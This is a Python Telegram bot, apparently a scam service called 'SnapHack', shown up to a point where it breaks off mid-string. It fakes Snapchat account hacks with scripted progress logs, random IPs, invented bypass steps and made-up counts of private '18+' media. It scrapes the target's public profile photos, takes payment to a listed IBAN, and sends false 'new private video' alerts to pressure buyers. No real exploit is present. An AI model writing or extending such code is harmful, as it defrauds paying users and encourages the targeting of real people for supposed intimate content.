import os
import subprocess
import time
from threading import Thread
from pathlib import Path
from random import sample, randint, choice
from flask import Flask
import asyncio
import re
import requests
from bs4 import BeautifulSoup
from PIL import Image, ImageFilter
import urllib.request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from telegram.constants import ParseMode

BASE = Path(__file__).parent

# 📂 Dateien
USERS_FILE = "users.txt"
COUNTER_FILE = "hack_counter.txt"

def load_env_file(env_file: Path):
    if not env_file.exists():
        return

    for raw_line in env_file.read_text(encoding="utf-8").splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#") or "=" not in line:
            continue
        key, value = line.split("=", 1)
        os.environ.setdefault(key.strip(), value.strip())

# ---- Hack-Zähler (persistent) ----
def get_hack_count() -> int:
    if not os.path.exists(COUNTER_FILE):
        with open(COUNTER_FILE, "w") as f:
            f.write("533")
        return 533
    with open(COUNTER_FILE, "r") as f:
        try:
            return int(f.read().strip())
        except ValueError:
            return 533

def increment_hack_count() -> int:
    count = get_hack_count() + 1
    with open(COUNTER_FILE, "w") as f:
        f.write(str(count))
    return count

# ✅ Umgebungsvariablen laden
load_env_file(BASE / ".env")

TOKEN = os.getenv("TOKEN")
CHANNEL_ID = os.getenv("CHANNEL_ID")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")

if not TOKEN:
    raise ValueError("❌ Umgebungsvariable 'TOKEN' fehlt!")
if not CHANNEL_ID or not ADMIN_CHAT_ID:
    raise ValueError("❌ 'CHANNEL_ID' oder 'ADMIN_CHAT_ID' fehlt!")

CHANNEL_ID = int(CHANNEL_ID)
ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)

# 🗂️ Ordner einrichten
IMAGE_DIR = BASE / "images"
VIDEO_DIR = BASE / "videos"
TEMP_DIR  = BASE / "temp"
PROFILE_DIR = BASE / "profiles"
PICS_DIR = BASE / "pics"

for p in (IMAGE_DIR, VIDEO_DIR, TEMP_DIR, PROFILE_DIR, PICS_DIR):
    p.mkdir(exist_ok=True, parents=True)

# 💬 Mapping: Nachricht-ID im Admin-Chat -> User-ID
forwarded_msg_to_user: dict[int, int] = {}

# ---- Speicher ----
user_proof_sent = set()
user_content_counts = {}
age_verified = set()
user_plan: dict[int, str] = {}
refund_state: dict[int, dict] = {}
hilfe_state: dict[int, dict] = {}

# ---- Hack-Limit ----
HACK_LIMIT = 2
HACK_WINDOW_SECS = 12 * 3600
user_hack_times: dict[int, list] = {}

# ---- Hack-Verlauf ----
user_hack_history: dict[int, list[str]] = {}

# ---- Premium Freischaltung ----
premium_pending: set[int] = set()
premium_approved: set[int] = set()

# ---- Letztes Hack-Ziel pro Nutzer ----
user_last_target: dict[int, str] = {}

# ---- Aktive Erinnerungs-Tasks ----
user_reminder_tasks: dict[int, asyncio.Task] = {}

# ---- Hack-Bestätigung ----
pending_hack_results: dict[int, dict] = {}
user_confirm_used: dict[int, float] = {}
CONFIRM_WINDOW_SECS = 12 * 3600

# ---- Auto-Cleanup Intervall ----
CLEANUP_INTERVAL_HOURS = 6

# ---- Hilfsfunktion: Nutzer-Bezeichnung ----
def user_label(from_user) -> str:
    if from_user.username:
        return f"@{from_user.username}"
    return f"ID: {from_user.id}"

def get_random_info_picture():
    pictures = [
        PICS_DIR / f"{index}.png"
        for index in range(1, 6)
        if (PICS_DIR / f"{index}.png").is_file()
    ]
    return choice(pictures) if pictures else None

async def send_snap_info_message(
    context,
    chat_id: int,
    caption_text: str,
    message_text: str = None,
    reply_markup=None,
    fallback_photos=None,
    disable_web_page_preview: bool = False,
):
    photo_candidates = []
    random_picture = get_random_info_picture()
    if random_picture is not None:
        photo_candidates.append(random_picture)
    if fallback_photos:
        photo_candidates.extend(fallback_photos)

    seen_paths = set()
    for photo_path in photo_candidates:
        photo_key = str(photo_path)
        if photo_key in seen_paths or not photo_path.is_file():
            continue
        seen_paths.add(photo_key)
        try:
            with open(photo_path, "rb") as photo_f:
                await context.bot.send_photo(
                    chat_id=chat_id,
                    photo=photo_f,
                    caption=caption_text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=reply_markup,
                )
            return True
        except Exception as e:
            print(f"⚠️ Konnte Info-Bild {photo_path.name} nicht senden: {e}")

    await context.bot.send_message(
        chat_id=chat_id,
        text=message_text or caption_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup,
        disable_web_page_preview=disable_web_page_preview,
    )
    return False

# ---- Automatische Erinnerungen ----
async def schedule_reminders(bot, user_id: int):
    try:
        await asyncio.sleep(3600)
        if user_id not in user_proof_sent:
            try:
                await bot.send_message(
                    chat_id=user_id,
                    text=(
                        "⏳ <b>Dein Hack-Zugang läuft ab!</b>\n\n"
                        "Hey! Du hast vor Kurzem ein Paket ausgewählt, aber noch keine "
                        "Zahlung abgeschlossen.\n\n"
                        "📂 Deine gesicherten Daten werden in Kürze automatisch gelöscht.\n\n"
                        "👉 Jetzt freischalten mit /pay\n\n"
                        "🔒 Alle Zahlungen sind sicher &amp; anonym."
                    ),
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
        await asyncio.sleep(7200)
        if user_id not in user_proof_sent:
            try:
                await bot.send_message(
                    chat_id=user_id,
                    text=(
                        "🚨 <b>Letzte Chance — Zugang verfällt bald!</b>\n\n"
                        "Wir haben noch keinen Zahlungsbeleg von dir erhalten.\n\n"
                        "💾 Die gesicherten Inhalte des gehackten Kontos werden in "
                        "wenigen Stunden endgültig gelöscht.\n\n"
                        "💳 Jetzt zahlen: /pay\n"
                        "📸 Oder sende deinen Zahlungsbeleg direkt hier im Chat.\n\n"
                        "❓ Fragen? Schreib uns: @HunterThe1"
                    ),
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
    except asyncio.CancelledError:
        pass

async def schedule_premium_reminder(bot, user_id: int):
    try:
        await asyncio.sleep(1800)
        if user_id in premium_pending and user_id not in premium_approved:
            try:
                await bot.send_message(
                    chat_id=user_id,
                    text=(
                        "💎 <b>Dein Premium-Zugang wartet auf dich!</b>\n\n"
                        "Du hast das PREMIUM-Paket ausgewählt, aber noch keinen "
                        "Zahlungsbeleg eingeschickt.\n\n"
                        "📸 Sende einfach ein Foto oder Video deiner Überweisung "
                        "direkt hier im Chat — dann schalten wir dich sofort frei.\n\n"
                        "🏦 <b>IBAN:</b> <code>IE32 PPSE 9903 8091 8899 18</code>\n"
                        "👤 <b>Empfänger:</b> <code>Euro Hunter</code>\n"
                        "💶 <b>Betrag:</b> <code>95,00 EUR</code>\n\n"
                        "⏳ Dein Platz ist noch reserviert!"
                    ),
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
    except asyncio.CancelledError:
        pass

# ---- Auto-Cleanup ----
async def auto_cleanup(app):
    while True:
        await asyncio.sleep(CLEANUP_INTERVAL_HOURS * 3600)
        deleted = 0
        for folder in (TEMP_DIR, PROFILE_DIR):
            for f in folder.glob("*"):
                if f.is_file() and f.name != ".gitkeep":
                    try:
                        f.unlink()
                        deleted += 1
                    except Exception:
                        pass
        print(f"🧹 Cleanup: {deleted} Dateien gelöscht.")

# 📥 GitHub Media Downloader
def download_github_media():
    github_api_base = "https://api.github.com/repos/Ayman5552/snap/contents"
    imgs = [f for f in IMAGE_DIR.glob("*.*") if f.suffix.lower() in ('.jpg', '.jpeg', '.png', '.gif', '.webp') and f.name != '.gitkeep']
    vids = [f for f in VIDEO_DIR.glob("*.*") if f.suffix.lower() in ('.mp4', '.mov', '.avi') and f.name != '.gitkeep']
    if len(imgs) >= 5 and len(vids) >= 5:
        print(f"✅ Media bereits vorhanden: {len(imgs)} Bilder, {len(vids)} Videos")
        return True
    print("📥 Lade Media von GitHub...")
    try:
        img_response = requests.get(f"{github_api_base}/Images", timeout=30)
        if img_response.status_code == 200:
            for img in img_response.json()[:10]:
                if img['name'].lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp')):
                    img_path = IMAGE_DIR / img['name']
                    if not img_path.exists():
                        try:
                            urllib.request.urlretrieve(img['download_url'], img_path)
                        except Exception as e:
                            print(f"❌ {img['name']}: {e}")
    except Exception as e:
        print(f"⚠️ Bilder: {e}")
    try:
        vid_response = requests.get(f"{github_api_base}/videos", timeout=30)
        if vid_response.status_code == 200:
            for vid in vid_response.json()[:5]:
                if vid['name'].lower().endswith(('.mp4', '.mov', '.avi')):
                    vid_path = VIDEO_DIR / vid['name']
                    if not vid_path.exists():
                        try:
                            urllib.request.urlretrieve(vid['download_url'], vid_path)
                        except Exception as e:
                            print(f"❌ {vid['name']}: {e}")
    except Exception as e:
        print(f"⚠️ Videos: {e}")
    return True

# 🎛️ Blur
BLUR_IMAGE_RADIUS = 28
VIDEO_BLUR_SIGMA = 36

# ---- Webserver (keep alive) ----
app = Flask('')

@app.route('/')
def home():
    return "I'm alive"

def keep_alive():
    port = int(os.environ.get("PORT", 5000))
    Thread(target=lambda: app.run(host='0.0.0.0', port=port)).start()

# ---- Bild/Video Verarbeitung ----
def censor_image(input_path: Path, output_path: Path):
    try:
        im = Image.open(input_path).convert("RGB")
        im = im.filter(ImageFilter.GaussianBlur(BLUR_IMAGE_RADIUS))
        im.save(output_path, format="JPEG", quality=90)
        return True
    except Exception as e:
        print(f"❌ Zensieren fehlgeschlagen: {e}")
        return False

def check_ffmpeg():
    try:
        subprocess.run(['ffmpeg', '-version'], capture_output=True, check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def censor_video(input_path: Path, output_path: Path):
    if not check_ffmpeg():
        return False
    cmd = [
        "ffmpeg", "-y", "-i", str(input_path),
        "-vf", f"gblur=sigma={VIDEO_BLUR_SIGMA}",
        "-c:v", "libx264", "-preset", "veryfast", "-crf", "28", "-an",
        str(output_path),
    ]
    try:
        subprocess.run(cmd, check=True, capture_output=True, text=True)
        return True
    except subprocess.CalledProcessError as e:
        print("❌ ffmpeg:", e.stderr)
        return False

# ---- Snapchat Scraping ----
def extract_snapchat_profile_data(username: str):
    url = f"https://www.snapchat.com/@{username}"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    try:
        resp = requests.get(url, headers=headers, timeout=15)
        if resp.status_code != 200:
            return False, None, None, None
        if "Sorry, this account doesn't exist." in resp.text or "Not Found" in resp.text:
            return False, None, None, None
        soup = BeautifulSoup(resp.text, "html.parser")
        name = username
        title = soup.find("title")
        if title:
            name = title.text.strip().split("(")[0].strip()
        bitmoji_url = None
        for elem in soup.find_all(['img', 'picture', 'source'], attrs={'src': re.compile(r'.*bitmoji.*', re.I)}):
            src = elem.get('src')
            if src:
                bitmoji_url = str(src)
                break
        if not bitmoji_url:
            for elem in soup.find_all(['img', 'picture', 'source'], attrs={'data-src': re.compile(r'.*bitmoji.*', re.I)}):
                src = elem.get('data-src')
                if src:
                    bitmoji_url = str(src)
                    break
        profile_photo_url = None
        for elem in soup.find_all(['img'], attrs={'src': re.compile(r'.*(profile|avatar|user).*\.(jpg|jpeg|png|webp)', re.I)}):
            src = elem.get('src')
            if src and 'bitmoji' not in str(src).lower():
                profile_photo_url = str(src)
                break
        if not profile_photo_url:
            meta = soup.find('meta', property='og:image')
            if meta:
                content = meta.get('content')
                if content and 'bitmoji' not in str(content).lower():
                    profile_photo_url = str(content)
        return True, name, bitmoji_url, profile_photo_url
    except Exception as e:
        print("Snapchat Fehler:", e)
        return False, None, None, None

def download_image(url: str, filename: str) -> bool:
    if not url:
        return False
    clean_filename = re.sub(r'[^\w\-_\.]', '_', filename)
    if not clean_filename or '..' in clean_filename:
        clean_filename = f"profile_{hash(filename) % 10000}.jpg"
    try:
        response = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        if response.status_code == 200:
            with open(PROFILE_DIR / clean_filename, 'wb') as f:
                f.write(response.content)
            return True
    except Exception as e:
        print(f"❌ Download {url}: {e}")
    return False

# ---- Hack Hilfsfunktionen ----
def progress_bar(percent: int, length: int = 16) -> str:
    filled = int(length * percent / 100)
    return f"[{'█' * filled}{'░' * (length - filled)}] {percent}%"

def fake_ip() -> str:
    return f"{randint(100,255)}.{randint(10,254)}.{randint(10,254)}.{randint(1,99)}"

def fake_token() -> str:
    chars = "abcdef0123456789"
    return "".join(sample(chars, 8)) + "-" + "".join(sample(chars, 4))

# ---- PAKET-AUSWAHL ----
PACKAGE_KEYBOARD = InlineKeyboardMarkup([
    [InlineKeyboardButton("📦 BASIC — 45 € / Hack", callback_data="plan_basic")],
    [InlineKeyboardButton("💎 PREMIUM — 95 € / Monat", callback_data="plan_premium")],
])

PACKAGE_TEXT = (
    "🎯 <b>Wähle dein Paket:</b>\n"
    "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
    "📦 <b>BASIC — 45 € / Hack</b>\n"
    "• 1 Hack nach Bedarf\n"
    "• Zugriff auf alle Inhalte\n"
    "• Sofortzugang nach Zahlung\n\n"
    "💎 <b>PREMIUM — 95 € / Monat</b>\n"
    "• 2 Hacks pro Woche\n"
    "• Prioritäts-Support\n"
    "• Exklusiver Dauerzugang\n\n"
    "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
    "👇 Wähle jetzt dein Paket:"
)

def main_menu_text(plan: str) -> str:
    if plan == "premium":
        paket_info = "💎 <b>Paket:</b> <code>PREMIUM — 2 Hacks/Woche (95 €/Monat)</code>\n\n"
    else:
        paket_info = "📦 <b>Paket:</b> <code>BASIC — 45 € pro Hack</code>\n\n"
    return (
        "🖥 <b>SnapHack v2.4 — gestartet</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        "✅ Paket ausgewählt. Zugang gewährt.\n\n"
        f"{paket_info}"
        "⚠️ <b>Voraussetzungen:</b> Zielkonto muss in den letzten 30 Tagen aktiv gewesen sein "
        "&amp; unter 18.000 Follower haben.\n\n"
        "<b>Schritt 1:</b> Tritt unserem Kanal bei:\n"
        "👉 t.me/+7tgziUqjnZUyZDYx\n\n"
        "<b>Schritt 2:</b> Starte deinen Hack:\n"
        "<code>/hack Benutzername</code>\n\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        "⭐ Bewertungen: /bew\n"
        "💳 Zahlungsbeweise einfach hier im Chat senden."
    )

# ---- START ----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id

    if uid not in age_verified:
        keyboard = [
            [InlineKeyboardButton("✅ Ja, ich bin volljährig (18+)", callback_data="age_yes")],
            [InlineKeyboardButton("❌ Nein, ich bin minderjährig", callback_data="age_no")],
        ]
        await update.message.reply_text(
            "👋 Willkommen! Bevor es losgeht, brauchen wir kurz deine Bestätigung.\n\n"
            "⚠️ <b>Dieser Bot richtet sich ausschließlich an Personen ab 18 Jahren.</b>\n\n"
            "Bitte bestätige dein Alter, um fortzufahren:",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    uname = user.username or ""
    with open(USERS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid} {uname}\n")

    if uid not in user_plan:
        await update.message.reply_text(
            PACKAGE_TEXT,
            parse_mode=ParseMode.HTML,
            reply_markup=PACKAGE_KEYBOARD
        )
        return

    await update.message.reply_text(
        main_menu_text(user_plan[uid]),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

# ---- ALTERSVERIFIKATION ----
async def age_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    uid = user.id

    if query.data == "age_yes":
        age_verified.add(uid)
        uname = user.username or ""
        with open(USERS_FILE, "a", encoding="utf-8") as f:
            f.write(f"{uid} {uname}\n")
        await query.edit_message_text(
            "✅ <b>Alter bestätigt!</b>\n\n" + PACKAGE_TEXT,
            parse_mode=ParseMode.HTML,
            reply_markup=PACKAGE_KEYBOARD
        )
    elif query.data == "age_no":
        await query.edit_message_text(
            "🚫 Dieser Bot ist nur für Personen ab 18 Jahren zugänglich.\n\n"
            "Bitte komm wieder, sobald du volljährig bist! 👋"
        )

# ---- ADMIN: /listusers ----
async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    if not os.path.exists(USERS_FILE):
        await update.message.reply_text("Noch keine Nutzer gespeichert.")
        return
    with open(USERS_FILE, "r", encoding="utf-8") as f:
        data = f.read().strip()
    await update.message.reply_text(f"📋 Gespeicherte Nutzer:\n\n{data}" if data else "Noch keine Nutzer gespeichert.")

# ---- ADMIN: /send ----
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return

    if not context.args:
        await update.message.reply_text(
            "⚠️ Kein Text angegeben!\n\nNutzung:\n<code>/send Deine Nachricht hier</code>",
            parse_mode=ParseMode.HTML
        )
        return

    message = " ".join(context.args)

    if not os.path.exists(USERS_FILE):
        await update.message.reply_text("❌ Keine Nutzer gefunden.")
        return

    with open(USERS_FILE, "r", encoding="utf-8") as f:
        lines = f.read().strip().splitlines()

    seen_ids = set()
    success = 0
    failed = 0

    for line in lines:
        parts = line.strip().split()
        if not parts:
            continue
        try:
            uid = int(parts[0])
        except ValueError:
            continue
        if uid in seen_ids:
            continue
        seen_ids.add(uid)
        try:
            await context.bot.send_message(chat_id=uid, text=message, parse_mode=ParseMode.HTML)
            success += 1
        except Exception:
            failed += 1

    await update.message.reply_text(
        f"✅ Broadcast abgeschlossen.\n\n"
        f"📤 Gesendet: <b>{success}</b>\n"
        f"❌ Fehlgeschlagen: <b>{failed}</b>",
        parse_mode=ParseMode.HTML
    )

# ---- ADMIN: /stats ----
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return

    total_users = 0
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            seen = set()
            for line in f:
                parts = line.strip().split()
                if parts:
                    try:
                        seen.add(int(parts[0]))
                    except ValueError:
                        pass
        total_users = len(seen)

    now = time.time()
    hacks_today = sum(
        len([t for t in times if now - t < 86400])
        for times in user_hack_times.values()
    )

    total_hacks = get_hack_count()

    await update.message.reply_text(
        "📊 <b>Bot-Statistiken</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"👥 <b>Gesamt-Nutzer:</b> <code>{total_users}</code>\n"
        f"💎 <b>Premium ausstehend:</b> <code>{len(premium_pending)}</code>\n"
        f"✅ <b>Premium aktiv:</b> <code>{len(premium_approved)}</code>\n"
        f"💻 <b>Hacks heute:</b> <code>{hacks_today}</code>\n"
        f"🔢 <b>Hacks gesamt:</b> <code>{total_hacks}</code>\n"
        f"💳 <b>Bezahlt:</b> <code>{len(user_proof_sent)}</code>",
        parse_mode=ParseMode.HTML
    )

# ---- ADMIN: /remind ----
async def remind_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return

    if not os.path.exists(USERS_FILE):
        await update.message.reply_text("❌ Keine Nutzer gefunden.")
        return

    with open(USERS_FILE, "r", encoding="utf-8") as f:
        lines = f.read().strip().splitlines()

    seen_ids = set()
    success = 0
    failed = 0

    for line in lines:
        parts = line.strip().split()
        if not parts:
            continue
        try:
            uid = int(parts[0])
        except ValueError:
            continue
        if uid in seen_ids:
            continue
        seen_ids.add(uid)
        if uid in user_proof_sent:
            continue

        target = user_last_target.get(uid)
        total_secs = randint(10, 600)
        mins = total_secs // 60
        secs = total_secs % 60
        duration_str = f"{mins}:{secs:02d} Min." if mins > 0 else f"0:{secs:02d} Min."
        mb_size = round(total_secs * randint(80, 250) / 1000, 1)
        mb_str = f"{mb_size} MB"

        if target:
            message = (
                f"🔴 <b>Neue Aktivität erkannt!</b>\n\n"
                f"<a href=\"https://snapchat.com/@{target}\">snapchat.com/@{target}</a> hat gerade ein neues <b>privates Video</b> hochgeladen.\n\n"
                f"📹 <b>Länge:</b> <code>{duration_str}</code>\n"
                f"📦 <b>Größe:</b> <code>{mb_str}</code>\n"
                f"🔒 <b>Status:</b> <code>Privat — nur für Follower sichtbar</code>\n"
                f"💾 Das Video wurde bereits auf unseren Servern gesichert.\n\n"
                f"⚠️ <b>Zugang läuft in Kürze ab!</b>\n\n"
                f"👉 Jetzt freischalten: /pay\n"
                f"❓ Fragen? @HunterThe1"
            )
        else:
            message = (
                "🔴 <b>Neue Aktivität erkannt!</b>\n\n"
                "Das gehackte Konto hat gerade ein neues <b>privates Video</b> hochgeladen.\n\n"
                f"📹 <b>Länge:</b> <code>{duration_str}</code>\n"
                f"📦 <b>Größe:</b> <code>{mb_str}</code>\n"
                f"🔒 <b>Status:</b> <code>Privat — nur für Follower sichtbar</code>\n"
                "💾 Das Video wurde bereits auf unseren Servern gesichert.\n\n"
                "⚠️ <b>Zugang läuft in Kürze ab!</b>\n\n"
                "👉 Jetzt freischalten: /pay\n"
                "❓ Fragen? @HunterThe1"
            )
        try:
            await context.bot.send_message(chat_id=uid, text=message, parse_mode=ParseMode.HTML)
            success += 1
        except Exception:
            failed += 1

    await update.message.reply_text(
        f"✅ Erinnerungen gesendet.\n\n"
        f"📤 Gesendet: <b>{success}</b>\n"
        f"❌ Fehlgeschlagen: <b>{failed}</b>",
        parse_mode=ParseMode.HTML
    )

# ---- ADMIN: /sendcontent ----
async def send_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    await update.message.reply_text("Hinweis: Automatisches Versenden von Preview-Medien ist deaktiviert.")

# ---- HACK ----
async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ["left", "kicked"]:
            await update.message.reply_text(
                "⛔ <b>Zugriff verweigert</b>\n\n"
                "Du musst zuerst unserem Kanal beitreten:\n\n"
                "👉 t.me/+7tgziUqjnZUyZDYx\n\n"
                "Danach einfach nochmal /hack versuchen.",
                parse_mode=ParseMode.HTML
            )
            return
    except Exception as e:
        print("Fehler bei get_chat_member:", e)
        await update.message.reply_text("⚠️ Fehler bei der Kanal-Überprüfung. Bitte später erneut versuchen.")
        return

    if user_plan.get(user_id) == "premium" and user_id not in premium_approved:
        await update.message.reply_text(
            "⏳ <b>Dein Premium-Zugang wird noch geprüft.</b>\n\n"
            "Sobald dein Zahlungsbeleg bestätigt wurde, wirst du automatisch benachrichtigt "
            "und kannst sofort loslegen.\n\n"
            "Falls du noch kein Beweisfoto oder -video gesendet hast, sende es jetzt einfach hier im Chat.",
            parse_mode=ParseMode.HTML
        )
        return

    now = time.time()
    recent = [t for t in user_hack_times.get(user_id, []) if now - t < HACK_WINDOW_SECS]
    if len(recent) >= HACK_LIMIT:
        next_allowed = recent[0] + HACK_WINDOW_SECS
        remaining = next_allowed - now
        wait_h = int(remaining // 3600)
        wait_m = int((remaining % 3600) // 60)
        await update.message.reply_text(
            "⛔ <b>Tages-Limit erreicht!</b>\n\n"
            "Du hast bereits <b>2 Benutzernamen</b> in den letzten 12 Stunden überprüft.\n\n"
            f"⏳ Bitte warte noch <b>{wait_h} Stunde(n) {wait_m} Minute(n)</b>, "
            f"dann stehen dir neue Hacks zur Verfügung.\n\n"
            "💎 Mit dem <b>PREMIUM-Paket</b> bekommst du 2 Hacks pro Woche — jetzt upgraden mit /start",
            parse_mode=ParseMode.HTML
        )
        return

    if not context.args:
        await update.message.reply_text(
            "⚠️ <b>Kein Benutzername angegeben!</b>\n\n"
            "Nutze den Befehl so:\n"
            "<code>/hack Benutzername</code>\n\n"
            "Beispiel: <code>/hack Lina.123</code>",
            parse_mode=ParseMode.HTML
        )
        return

    user_hack_times[user_id] = recent + [now]

    username = context.args[0]
    user_last_target[user_id] = username

    # Hack-Verlauf speichern
    if user_id not in user_hack_history:
        user_hack_history[user_id] = []
    user_hack_history[user_id].append(username)

    hack_nr = increment_hack_count()
    ip_src = fake_ip()
    ip_dst = fake_ip()
    session_token = fake_token()
    last_seen_min = randint(14, 40)
    neue_inhalte = randint(2, 6)
    fake_followers = randint(800, 17900)

    def build_log(*lines, bar_pct: int) -> str:
        body = "\n".join(f"<code>{l}</code>" for l in lines)
        return f"{body}\n<code>{progress_bar(bar_pct)}</code>"

    msg = await update.message.reply_text(
        build_log(f"[ SYSTEM ] Initialisiere Verbindung...", f"[ NET    ] SRC: {ip_src} → DST: {ip_dst}",
                  f"[ AUTH  ] Session-Token wird generiert...", bar_pct=0), parse_mode=ParseMode.HTML)
    await asyncio.sleep(1.5)

    await msg.edit_text(
        build_log(f"[ SYSTEM ] Verbindung aufgebaut          ✓", f"[ NET    ] SRC: {ip_src} → DST: {ip_dst}",
                  f"[ AUTH  ] Token: {session_token}  ✓", f"[ SCAN  ] Starte Ziel-Analyse: @{username}...",
                  bar_pct=15), parse_mode=ParseMode.HTML)
    await asyncio.sleep(1.5)

    exists, name, bitmoji_url, profile_photo_url = await asyncio.to_thread(extract_snapchat_profile_data, username)

    if not exists:
        await msg.edit_text(
            build_log(f"[ SCAN  ] Ziel-Analyse: @{username}", f"[ ERROR ] Konto nicht gefunden oder privat gesperrt.",
                      f"[ INFO  ] Prüfe ob der Username korrekt ist.", bar_pct=100), parse_mode=ParseMode.HTML)
        return

    await msg.edit_text(
        build_log(f"[ SYSTEM ] Verbindung aufgebaut          ✓", f"[ AUTH  ] Token: {session_token}  ✓",
                  f"[ SCAN  ] Profil gefunden: {name}        ✓", f"[ CHECK ] Voraussetzungen werden geprüft...",
                  bar_pct=30), parse_mode=ParseMode.HTML)
    await asyncio.sleep(1.5)

    await msg.edit_text(
        build_log(f"[ SCAN  ] Profil gefunden: {name}        ✓",
                  f"[ CHECK ] Letzter Login: vor {last_seen_min} Min.    ✓",
                  f"[ CHECK ] Follower: {fake_followers} (&lt; 18.000)      ✓",
                  f"[ BYPASS] Snapchat SSL-Pinning...", bar_pct=40), parse_mode=ParseMode.HTML)
    await asyncio.sleep(1.5)

    await msg.edit_text(
        build_log(f"[ SCAN  ] Profil gefunden: {name}        ✓", f"[ CHECK ] Voraussetzungen OK              ✓",
                  f"[ BYPASS] Snapchat SSL-Pinning...        ✓", f"[ BYPASS] 2FA Firewall...                ✓",
                  f"[ EXFIL ] Extrahiere Account-Daten...", bar_pct=55), parse_mode=ParseMode.HTML)
    await asyncio.sleep(1.5)

    bitmoji_downloaded = False
    profile_downloaded = False
    if bitmoji_url and isinstance(bitmoji_url, str):
        bitmoji_downloaded = await asyncio.to_thread(download_image, bitmoji_url, f"bitmoji_{username}.jpg")
    if profile_photo_url and isinstance(profile_photo_url, str):
        profile_downloaded = await asyncio.to_thread(download_image, profile_photo_url, f"profile_{username}.jpg")

    bilder = randint(8, 12)
    videos = randint(7, 8)
    user_content_counts[user_id] = {"bilder": bilder, "videos": videos}

    await msg.edit_text(
        build_log(f"[ SCAN  ] Profil gefunden: {name}        ✓", f"[ BYPASS] SSL-Pinning + 2FA umgangen     ✓",
                  f"[ EXFIL ] Account-Daten extrahiert       ✓",
                  f"[ MEDIA ] {bilder} Bilder + {videos} Videos gefunden  ✓",
                  f"[ SYNC  ] Lade Inhalte in sicheren Server...", bar_pct=70), parse_mode=ParseMode.HTML)
    await asyncio.sleep(1.5)

    await msg.edit_text(
        build_log(f"[ SCAN  ] Profil gefunden: {name}        ✓", f"[ BYPASS] SSL-Pinning + 2FA umgangen     ✓",
                  f"[ EXFIL ] Account-Daten extrahiert       ✓",
                  f"[ MEDIA ] {bilder} Bilder + {videos} Videos gesichert ✓",
                  f"[ SYNC  ] Upload läuft... ({bilder + videos} Dateien)", bar_pct=88), parse_mode=ParseMode.HTML)
    await asyncio.sleep(1.5)

    await msg.edit_text(
        build_log(f"[ BYPASS] SSL-Pinning + 2FA umgangen     ✓", f"[ EXFIL ] Account-Daten extrahiert       ✓",
                  f"[ MEDIA ] {bilder} Bilder + {videos} Videos gesichert ✓",
                  f"[ SYNC  ] Upload abgeschlossen            ✓", f"[ FINAL ] Erstelle Zugangslink...",
                  bar_pct=100), parse_mode=ParseMode.HTML)
    await asyncio.sleep(1.5)

    snap_link = f'<a href="https://snapchat.com/@{username}">snapchat.com/@{username}</a>'

    result_lines = (
        f"<code>{'━'*34}</code>\n<code>   ✅ HACK ERFOLGREICH ABGESCHLOSSEN</code>\n<code>{'━'*34}</code>\n\n"
        f"🔢 <b>Hack #{hack_nr}</b>\n🎯 <b>Ziel:</b> {snap_link}\n"
        f"👤 <b>Name:</b> <code>{name}</code>\n🔓 <b>Status:</b> <code>Konto kompromittiert</code>\n"
        f"🕐 <b>Zuletzt aktiv:</b> <code>vor {last_seen_min} Minuten</code>\n"
        f"👥 <b>Follower:</b> <code>{fake_followers} (Voraussetzung OK)</code>\n"
        f"📅 <b>Diese Woche neu:</b> <code>{neue_inhalte} Dateien (privat)</code>\n\n"
        f"📂 <b>Gesicherte Inhalte:</b>\n  🖼 <code>{bilder} Bilder (18+ markiert)</code>\n"
        f"  📹 <code>{videos} Videos (privat)</code>\n"
    )
    if bitmoji_downloaded:
        result_lines += f"  🎭 <code>Bitmoji extrahiert</code>\n"
    if profile_downloaded:
        result_lines += f"  📸 <code>Profilbild gesichert</code>\n"
    result_lines += (
        f"\n<code>{'━'*34}</code>\n💰 <b>Zugang freischalten für 45 €</b>\n\n"
        f"👉 Zahlung starten mit /pay\n"
        f"🔗 Mega-Ordner: https://mega.nz/folder/JU5zGDxQ#-Hxqn4xBLRIbM8vBFFFvZQ\n\n"
